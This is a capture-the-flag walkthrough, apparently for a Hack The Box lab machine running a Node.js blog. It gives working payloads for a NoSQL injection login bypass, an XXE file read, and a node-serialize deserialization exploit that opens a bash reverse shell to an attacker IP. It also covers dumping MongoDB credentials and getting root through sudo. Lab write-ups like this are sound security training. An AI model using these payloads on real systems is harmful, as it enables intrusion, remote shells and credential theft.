<h2 id="phase-1-reconnaissance">Phase 1: Reconnaissance</h2>
<h3 id="step-1-full-port-scan">Step 1: Full Port Scan</h3>
<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.96.160
</code></pre>
<p><strong>Why <code>-p-</code>?</strong><br>By default nmap only scans the top 1000 ports. Many CTF machines (and real targets) run services on non-standard ports. <code>-p-</code> scans all 65535 ports so nothing is missed.</p>
<p><strong>Why <code>--min-rate 10000</code>?</strong><br>Speed. On HTB the machine is yours alone, so aggressive scanning is fine. This sends at least 10,000 packets per second instead of nmap's slow default.</p>
<p><strong>Result:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 2"><code>22/tcp   open  ssh
5000/tcp open  upnp
</code></pre>
<p><strong>What this tells us:</strong><br>Two ports. SSH on 22 is standard - usually only useful once we have credentials. Port 5000 is interesting - "upnp" is nmap's best guess but it could be anything. We investigate.</p>
<hr>
<h3 id="step-2-service-version-scan">Step 2: Service Version Scan</h3>
<pre tabindex="0" aria-label="bash code or terminal block 3"><code class="language-bash" data-language="bash">nmap -p 22,5000 -sCV 10.129.96.160
</code></pre>
<p><strong>Why <code>-sCV</code>?</strong>  </p>
<ul>
<li><code>-sC</code> runs default scripts (fingerprints the service, grabs banners, checks common vulnerabilities)  </li>
<li><code>-sV</code> probes for the exact version</li>
</ul>
<p><strong>Result:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 4"><code>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
5000/tcp open  http    Node.js (Express middleware)
                       title: Blog
</code></pre>
<p><strong>What this tells us:</strong>  </p>
<ul>
<li>SSH version leaks the OS: Ubuntu 20.04 Focal. Filed away for later.</li>
<li>Port 5000 is a <strong>Node.js Express web app</strong> called "Blog". This is our primary attack surface.</li>
<li>Express is a minimal Node.js web framework - common in CTFs and known for certain vulnerability patterns.</li>
</ul>
<p> Technology fingerprinting tells you <em>what weapons to load</em>. Node.js + Express has a known ecosystem of vulnerabilities. You're already thinking: NoSQL injection (if MongoDB is behind it), deserialization (node-serialize), prototype pollution.</p>

<h2 id="phase-2-web-application-enumeration">Phase 2: Web Application Enumeration</h2>
<h3 id="step-3-browse-the-site">Step 3: Browse the Site</h3>
<p>Visiting <code>http://10.129.96.160:5000</code> shows a blog. There's a <strong>Login</strong> button.</p>
<p><strong>Why enumerate the login first?</strong><br>Authentication is the gatekeeper. Bypassing it gives you more functionality to attack. It's always step one with web apps.</p>
<p><strong>What we see at <code>/login</code>:</strong><br>A standard username/password form. We try obvious credentials: <code>admin/admin</code>, <code>admin/password</code> - they fail, but the error message is important: "Invalid Password" (not "Invalid username"). This tells us <strong>admin is a valid username</strong>.</p>
<p> Error messages are information leaks. "Invalid Password" vs "Invalid Username/Password" confirms account existence.</p>
<hr>
<h2 id="phase-3-nosql-injection-authentication-bypass">Phase 3: NoSQL Injection: Authentication Bypass</h2>
<h3 id="step-4-identify-the-backend">Step 4: Identify the Backend</h3>
<p>Express + Node.js apps very commonly use <strong>MongoDB</strong> as their database (the "M" in the MEAN stack). MongoDB queries are JSON-based and vulnerable to a class of attack called <strong>NoSQL injection</strong>.</p>
<h3 id="step-5-understanding-the-attack">Step 5: Understanding the Attack</h3>
<p>Normal login sends this POST body:</p>
<pre tabindex="0" aria-label="Code or terminal block 5"><code>user=admin&amp;password=REDACTED
</code></pre>
<p>The server likely runs a MongoDB query like:</p>
<pre tabindex="0" aria-label="javascript code or terminal block 6"><code class="language-javascript" data-language="javascript">db.users.findOne({ user: "admin", password: "REDACTED" })
</code></pre>
<p>If MongoDB receives a <strong>JSON object</strong> instead of a string for the password field, we can pass operators like <code>$ne</code> (not equal). The query becomes:</p>
<pre tabindex="0" aria-label="javascript code or terminal block 7"><code class="language-javascript" data-language="javascript">db.users.findOne({ user: "admin", password: { $ne: "wrongpassword" } })
</code></pre>
<p>This finds any user named <code>admin</code> whose password is <em>not</em> "wrongpassword" - which is every valid user. <strong>Auth bypassed.</strong></p>
<p><strong>But there's a catch:</strong> The browser sends form data as <code>application/x-www-form-urlencoded</code>. To pass JSON objects, we need <code>Content-Type: application/json</code>.</p>
<h3 id="step-6-execute-the-bypass">Step 6: Execute the Bypass</h3>
<pre tabindex="0" aria-label="bash code or terminal block 8"><code class="language-bash" data-language="bash">curl -s -i -X POST http://10.129.96.160:5000/login \
  -H 'Content-Type: application/json' \
  -d '{"user": "admin", "password": {"$ne": "wrongpassword"}}'
</code></pre>
<p><strong>Breaking it down:</strong></p>
<ul>
<li><code>-i</code> : show response headers (we need to see the cookie)</li>
<li><code>-X POST</code> : force a POST request</li>
<li><code>-H 'Content-Type: application/json'</code> : tell the server we're sending JSON</li>
<li><code>-d '...'</code> : the JSON body with our <code>$ne</code> injection</li>
</ul>
<p><strong>Result:</strong> The response contains:</p>
<pre tabindex="0" aria-label="Code or terminal block 9"><code>Set-Cookie: auth=REDACTED
</code></pre>
<p>URL-decoding that cookie gives us:</p>
<pre tabindex="0" aria-label="json code or terminal block 10"><code class="language-json" data-language="json">{"user":"admin","sign":"REDACTED_HASH_OR_FLAG"}
</code></pre>
<p>We're logged in as admin.</p>

<h2 id="phase-4-xxe-file-read">Phase 4: XXE: File Read</h2>
<h3 id="step-7-explore-the-authenticated-app">Step 7: Explore the Authenticated App</h3>
<p>Logged in, we see new features: "New Article", "Upload", "Edit", "Delete". The <strong>Upload</strong> button accepts files.</p>
<p> File upload = high value target. ask: what does the server <em>do</em> with the file? Parse it? Execute it? Store it?</p>
<p>Sending a random file returns:</p>
<pre tabindex="0" aria-label="Code or terminal block 11"><code>Invalid XML Example: &lt;post&gt;&lt;title&gt;...&lt;/title&gt;&lt;description&gt;...&lt;/description&gt;&lt;markdown&gt;...&lt;/markdown&gt;&lt;/post&gt;
</code></pre>
<p>The server expects <strong>XML</strong>. XML parsers are notoriously dangerous.</p>
<h3 id="step-8-understanding-xxe">Step 8: Understanding XXE</h3>
<p><strong>XML External Entity (XXE)</strong> is a vulnerability where an XML parser processes attacker-controlled entity definitions. You can define an entity that references a local file, and the parser substitutes the file contents into the document.</p>
<pre tabindex="0" aria-label="xml code or terminal block 12"><code class="language-xml" data-language="xml">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE data [
  &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;post&gt;
  &lt;markdown&gt;&amp;file;&lt;/markdown&gt;
&lt;/post&gt;
</code></pre>
<p>Here, <code>&amp;file;</code> is replaced by the contents of <code>/etc/passwd</code> when the XML is parsed.</p>
<h3 id="step-9-read-the-server-source-code">Step 9: Read the Server Source Code</h3>
<p>We know the app is Node.js, and common source file names are <code>server.js</code>, <code>index.js</code>, <code>app.js</code>. We target <code>/opt/blog/server.js</code> (a common deployment path on Linux).</p>
<pre tabindex="0" aria-label="bash code or terminal block 13"><code class="language-bash" data-language="bash">cat &gt; /tmp/xxe.xml &lt;&lt; 'EOF'
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE data [
&lt;!ENTITY file SYSTEM "file:///opt/blog/server.js"&gt;
]&gt;
&lt;post&gt;
  &lt;title&gt;test&lt;/title&gt;
  &lt;description&gt;test&lt;/description&gt;
  &lt;markdown&gt;&amp;file;&lt;/markdown&gt;
&lt;/post&gt;
EOF

curl -s -X POST http://10.129.96.160:5000/articles/xml \
  -H "Cookie: auth=REDACTED" \
  -F "file=@/tmp/xxe.xml"
</code></pre>
<p><strong>Result:</strong> The <code>markdown</code> textarea in the response contains the full <code>server.js</code> source. Key findings:</p>
<pre tabindex="0" aria-label="javascript code or terminal block 14"><code class="language-javascript" data-language="javascript">const serialize = require('node-serialize')           // ← DANGER
const cookie_secret = "UHC-SecretCookie"              // ← leaked secret

function authenticated(c) {
    c = serialize.unserialize(c)                      // ← called on raw cookie!
    if (c.sign == ...) { return true }
}
</code></pre>
<p><strong>Why is this critical?</strong><br><code>node-serialize.unserialize()</code> is being called on the raw value of the <code>auth</code> cookie <strong>before</strong> any validation. This means whatever we put in that cookie gets deserialized. This is the vulnerability.</p>
<hr>
<h2 id="phase-5-deserialization-rce-shell">Phase 5: Deserialization RCE: Shell</h2>
<h3 id="step-10-understanding-node-serialize">Step 10: Understanding node-serialize</h3>
<p>The <code>node-serialize</code> library has a known vulnerability: if a serialized object contains a function marked with the special prefix <code>_$$ND_FUNC$$_</code>, and that function is immediately invoked (IIFE - Immediately Invoked Function Expression), it executes arbitrary code during deserialization.</p>
<p><strong>Normal serialized object:</strong></p>
<pre tabindex="0" aria-label="json code or terminal block 15"><code class="language-json" data-language="json">{"user": "admin"}
</code></pre>
<p><strong>Malicious serialized object:</strong></p>
<pre tabindex="0" aria-label="json code or terminal block 16"><code class="language-json" data-language="json">{"rce": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()"}
</code></pre>
<p>The <code>()</code> at the end of the function makes it execute immediately when unserialized.</p>
<h3 id="step-11-craft-the-reverse-shell-payload">Step 11: Craft the Reverse Shell Payload</h3>
<p>A direct bash reverse shell has characters that break URL encoding. The safe approach is to base64-encode the shell command, then decode and execute it server-side.</p>
<p><strong>The reverse shell command:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 17"><code class="language-bash" data-language="bash">bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1
</code></pre>
<p><strong>Base64 encoded:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 18"><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44NC80NDQ0IDA+JjEK
</code></pre>
<p><strong>The deserialization payload:</strong></p>
<pre tabindex="0" aria-label="json code or terminal block 19"><code class="language-json" data-language="json">{
  "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('echo BASE64HERE|base64 -d|bash', function(error,stdout,stderr){console.log(stdout)});}()"
}
</code></pre>
<p>This entire JSON object must be <strong>URL-encoded</strong> for the cookie (spaces, braces, quotes are all special characters in HTTP cookies).</p>
<h3 id="step-12-start-the-listener">Step 12: Start the Listener</h3>
<p>In a separate terminal:</p>
<pre tabindex="0" aria-label="bash code or terminal block 20"><code class="language-bash" data-language="bash">nc -lnvp 4444
</code></pre>
<p><strong>Why netcat?</strong><br><code>nc</code> (netcat) listens on a port and prints anything that connects to it. When our reverse shell connects back, nc receives it and gives us an interactive terminal on the remote machine.</p>
<h3 id="step-13-send-the-payload">Step 13: Send the Payload</h3>
<pre tabindex="0" aria-label="bash code or terminal block 21"><code class="language-bash" data-language="bash">B64=$(echo 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1' | base64 -w0)

PAYLOAD=$(python3 -c "
import urllib.parse, json
cmd = 'echo ${B64}|base64 -d|bash'
obj = {\"rce\": \"_\$\$ND_FUNC\$\$_function(){require('child_process').exec('\" + cmd + \"', function(error,stdout,stderr){console.log(stdout)});}()\"}
print(urllib.parse.quote(json.dumps(obj)))
")

curl -s http://10.129.96.160:5000/ -H "Cookie: auth=${PAYLOAD}"
</code></pre>
<p><strong>What happens server-side:</strong>  </p>
<ol>
<li>Express receives the request with our malicious <code>auth</code> cookie</li>
<li><code>authenticated()</code> is called with our cookie value</li>
<li><code>serialize.unserialize(cookie)</code> executes - our IIFE fires</li>
<li><code>child_process.exec()</code> runs: decode base64 → pipe to bash → reverse shell connects out</li>
</ol>
<p><strong>Result:</strong> Shell received:</p>
<pre tabindex="0" aria-label="Code or terminal block 22"><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.96.160] 39852
admin@nodeblog:/opt/blog$
</code></pre>
<p>We have code execution as <code>admin</code>.</p>

<h2 id="phase-6-user-flag">Phase 6: User Flag</h2>
<h3 id="step-14-upgrade-the-shell-tty">Step 14: Upgrade the Shell (TTY)</h3>
<p>The shell we received is a "dumb" shell - no tab completion, Ctrl+C kills it, passwords don't echo. We upgrade it.</p>
<pre tabindex="0" aria-label="bash code or terminal block 23"><code class="language-bash" data-language="bash">script /dev/null -c bash
# Press Ctrl+Z
stty raw -echo; fg
# Type: reset
</code></pre>
<p><strong>Why?</strong>  </p>
<ul>
<li><code>script /dev/null -c bash</code> spawns bash under a pseudo-terminal (PTY)</li>
<li><code>Ctrl+Z</code> backgrounds it</li>
<li><code>stty raw -echo</code> sets our local terminal to raw mode (passes all keystrokes through)</li>
<li><code>fg</code> foregrounds the shell - now it's a proper interactive terminal</li>
</ul>
<h3 id="step-15-fix-the-home-directory">Step 15: Fix the Home Directory</h3>
<pre tabindex="0" aria-label="bash code or terminal block 24"><code class="language-bash" data-language="bash">chmod +x /home/admin
cd /home/admin
cat user.txt
</code></pre>
<p><strong>Why <code>chmod +x /home/admin</code>?</strong><br>The directory <code>/home/admin</code> was deployed with permissions <code>644</code> (no execute bit). On Linux, the <strong>execute bit on a directory</strong> means "permission to enter it". Without it, even the owner can't <code>cd</code> into it or access files by path. Adding <code>+x</code> restores normal access.</p>
<p><strong>This is a misconfiguration bug specific to this machine's deployment.</strong> Real-world lesson: directory permissions matter just as much as file permissions.</p>
<p><strong>Flag:</strong> <code>61e24c[redacted]3b3b3a4c92</code></p>

<h2 id="phase-7-privilege-escalation-to-root">Phase 7: Privilege Escalation to Root</h2>
<h3 id="step-16-enumerate-running-services">Step 16: Enumerate Running Services</h3>
<pre tabindex="0" aria-label="bash code or terminal block 25"><code class="language-bash" data-language="bash">netstat -tnlp
</code></pre>
<p>Output shows <code>127.0.0.1:27017</code> - that's <strong>MongoDB</strong>, listening only on localhost. It's accessible from our shell.</p>
<p> Any internal service is worth probing. Databases often hold credentials. No authentication was required here.</p>
<h3 id="step-17-dump-mongodb-credentials">Step 17: Dump MongoDB Credentials</h3>
<pre tabindex="0" aria-label="bash code or terminal block 26"><code class="language-bash" data-language="bash">mongo blog --eval "db.users.find().forEach(printjson)"
</code></pre>
<p><strong>Breaking it down:</strong></p>
<ul>
<li><code>mongo blog</code> : connect to the <code>blog</code> database</li>
<li><code>--eval "..."</code> : run a JavaScript expression non-interactively</li>
<li><code>db.users.find().forEach(printjson)</code> : dump all documents in the <code>users</code> collection, pretty-printed</li>
</ul>
<p><strong>Result:</strong></p>
<pre tabindex="0" aria-label="json code or terminal block 27"><code class="language-json" data-language="json">{
  "username": "admin",
  "password": "REDACTED"
}
</code></pre>
<p>Plaintext password. Developers often store passwords in plain text in development databases and forget to hash them before deploying.</p>
<h3 id="step-18-check-sudo-permissions">Step 18: Check sudo Permissions</h3>
<pre tabindex="0" aria-label="bash code or terminal block 28"><code class="language-bash" data-language="bash">sudo -l
</code></pre>
<p>Enter <code>IppsecSaysPleaseSubscribe</code> when prompted.</p>
<p>Output:</p>
<pre tabindex="0" aria-label="Code or terminal block 29"><code>User admin may run the following commands on nodeblog:
    (ALL) ALL
    (ALL : ALL) ALL
</code></pre>
<p><strong>Admin can run ANY command as ANY user.</strong> This is the highest possible sudo privilege - equivalent to being root already.</p>
<p><strong>Why does <code>su -</code> fail but <code>sudo su</code> works?</strong>  </p>
<ul>
<li><code>su -</code> switches to root using <strong>root's password</strong> (unknown to us)</li>
<li><code>sudo su</code> runs <code>su</code> <strong>as root</strong> (using admin's password, which we know)</li>
</ul>
<h3 id="step-19-get-root">Step 19: Get Root</h3>
<pre tabindex="0" aria-label="bash code or terminal block 30"><code class="language-bash" data-language="bash">sudo su
</code></pre>
<p>Enter <code>IppsecSaysPleaseSubscribe</code>.</p>
<pre tabindex="0" aria-label="bash code or terminal block 31"><code class="language-bash" data-language="bash">cat /root/root.txt
</code></pre>
